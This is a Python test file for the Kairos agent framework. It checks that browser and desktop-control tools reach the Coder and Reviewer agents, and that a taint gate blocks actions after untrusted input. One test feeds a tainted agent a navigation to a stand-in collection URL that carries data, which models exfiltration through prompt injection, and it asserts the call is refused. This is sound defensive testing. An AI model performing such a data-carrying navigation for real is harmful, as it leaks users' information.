"""The two modules that shipped with tests and no caller are now tools.

`kairos/browser.py` and `kairos/computer_use.py` both existed, both had unit
tests, and neither could be reached from a tool call -- while the bundled
computer-use skill told every model it had a `computer_use` tool. These tests
fail if the wiring in `Orchestrator._create_agents` is removed, and they prove
the gate covers the new tools instead of trusting that it does.
"""
from __future__ import annotations

from kairos.agents.base import KairosAgent
from kairos.core.message_bus import MessageBus
from kairos.core.orchestrator import Orchestrator, Project
from kairos.core.persistence import Persistence
from kairos.llm.base import LLMConfig, ToolCall
from kairos.sentinel import Sentinel, SentinelAudit
from kairos.taint import TaintTracker


class _Router:
    """Only `get_provider_for_role` is reached before `_make_agent` is stubbed."""

    def get_provider_for_role(self, role):
        return None


def _names(tools):
    return sorted(t.name for t in tools)


# ---------------------------------------------------------------------------
# wiring: the tools reach the roles
# ---------------------------------------------------------------------------

def test_the_coder_and_the_reviewer_are_given_the_new_tools(tmp_path, monkeypatch):
    monkeypatch.setenv("KAIROS_NO_BUNDLED_MCP", "1")
    orch = Orchestrator(model_router=_Router(), workspace_base=tmp_path / "ws",
                        db=Persistence(tmp_path / "kairos.db"))
    project = Project("p1", "n", "d", tmp_path / "ws" / "p1", db=orch._db)
    project.workspace.mkdir(parents=True, exist_ok=True)

    seen: dict = {}

    def fake_make_agent(project_id, role, role_cls, provider, tools, bus, prompts):
        seen[role] = list(tools)
        return type("A", (), {"agent_id": project_id + "." + role})()

    monkeypatch.setattr(orch, "_make_agent", fake_make_agent)
    orch._create_agents(project)

    coder = _names(seen["coder"])
    reviewer = _names(seen["reviewer"])
    assert "browser" in coder, coder
    assert "computer_use" in coder, coder
    # The Reviewer verifies UI work, so it gets the browser...
    assert "browser" in reviewer, reviewer
    # ...but desktop control stays with the Coder.
    assert "computer_use" not in reviewer, reviewer
    # The pre-existing tools are still there.
    for name in ("file_read", "file_write", "terminal", "git", "webfetch"):
        assert name in coder, name


def test_a_missing_browser_tool_does_not_break_the_coder(tmp_path, monkeypatch):
    """A machine without Playwright must still get a working Coder."""
    monkeypatch.setenv("KAIROS_NO_BUNDLED_MCP", "1")
    orch = Orchestrator(model_router=_Router(), workspace_base=tmp_path / "ws",
                        db=Persistence(tmp_path / "kairos.db"))
    project = Project("p2", "n", "d", tmp_path / "ws" / "p2", db=orch._db)
    project.workspace.mkdir(parents=True, exist_ok=True)

    import kairos.tools.browser_tool as bt
    monkeypatch.setattr(bt, "BrowserTool",
                        lambda *a, **k: (_ for _ in ()).throw(RuntimeError("no playwright")))
    seen: dict = {}

    def fake_make_agent(project_id, role, role_cls, provider, tools, bus, prompts):
        seen[role] = list(tools)
        return type("A", (), {"agent_id": project_id + "." + role})()

    monkeypatch.setattr(orch, "_make_agent", fake_make_agent)
    orch._create_agents(project)

    names = _names(seen["coder"])
    assert "file_write" in names and "terminal" in names
    assert any("browser_tool" in e for e in project.runtime.attach_errors)


# ---------------------------------------------------------------------------
# the gate covers the new tools on the real dispatch path
# ---------------------------------------------------------------------------

def _agent(tmp_path, tools, taint=None):
    return KairosAgent(
        agent_id="a1", name="coder", role="coder",
        system_prompt="You are the Coder.",
        llm_config=LLMConfig(provider="anthropic", model="m", api_key="sk-test"),
        message_bus=MessageBus(), tools=tools,
        taint=taint or TaintTracker(),
        sentinel=Sentinel(audit=SentinelAudit(directory=tmp_path / "audit")),
    )


class _FakeBrowserManager:
    def __init__(self, tmp_path):
        self.calls: list = []
        self.shot = tmp_path / "shot.png"

    async def navigate(self, pid, url):
        self.calls.append(("navigate", url))
        return {"url": url, "title": "T", "status": 200, "ok": True}

    async def save_screenshot(self, pid, full_page=False):
        self.calls.append(("screenshot",))
        self.shot.write_bytes(b"\x89PNG\r\n\x1a\n")
        return self.shot


def _new_tools(tmp_path, manager):
    from kairos.tools.browser_tool import BrowserTool
    from kairos.tools.computer_tool import ComputerTool
    return [BrowserTool(project_id="p1", manager=manager, allowed_root=tmp_path),
            ComputerTool(out_dir=tmp_path)]


async def test_a_tainted_run_may_look_at_the_page_but_not_navigate_it(tmp_path, monkeypatch):
    monkeypatch.setenv("KAIROS_COMPUTER_USE", "mock")
    manager = _FakeBrowserManager(tmp_path)
    tools = _new_tools(tmp_path, manager)
    taint = TaintTracker()
    taint.mark("network", "webfetch", "")          # the run read a page it cannot vouch for
    agent = _agent(tmp_path, tools, taint=taint)

    refused = await agent._dispatch_tool_with_args(
        ToolCall(id="1", name="browser",
                 arguments={"action": "navigate", "url": "http://collect.example.com/?d=1"}), None)
    assert refused.success is False
    assert "Refused by the Kairos gate" in refused.error
    assert ("navigate", "http://collect.example.com/?d=1") not in manager.calls

    allowed = await agent._dispatch_tool_with_args(
        ToolCall(id="2", name="browser", arguments={"action": "screenshot"}), None)
    assert allowed.success is True, allowed.error
    assert ("screenshot",) in manager.calls


async def test_a_tainted_run_may_look_at_the_screen_but_not_click_it(tmp_path, monkeypatch):
    monkeypatch.setenv("KAIROS_COMPUTER_USE", "mock")
    manager = _FakeBrowserManager(tmp_path)
    tools = _new_tools(tmp_path, manager)
    taint = TaintTracker()
    taint.mark("screen", "computer_use", "")       # this run has seen the screen
    agent = _agent(tmp_path, tools, taint=taint)

    refused = await agent._dispatch_tool_with_args(
        ToolCall(id="1", name="computer_use", arguments={"action": "click", "x": 1, "y": 2}), None)
    assert refused.success is False
    assert "Refused by the Kairos gate" in refused.error

    allowed = await agent._dispatch_tool_with_args(
        ToolCall(id="2", name="computer_use", arguments={"action": "capture"}), None)
    assert allowed.success is True, allowed.error
    assert allowed.metadata["backend"] == "MockComputerUse"


async def test_an_untainted_run_uses_the_browser_without_a_prompt(tmp_path):
    manager = _FakeBrowserManager(tmp_path)
    tools = _new_tools(tmp_path, manager)
    agent = _agent(tmp_path, tools)                # fresh run, no untrusted content

    res = await agent._dispatch_tool_with_args(
        ToolCall(id="1", name="browser",
                 arguments={"action": "navigate", "url": "http://localhost:5173/"}), None)
    assert res.success is True, res.error
    assert ("navigate", "http://localhost:5173/") in manager.calls
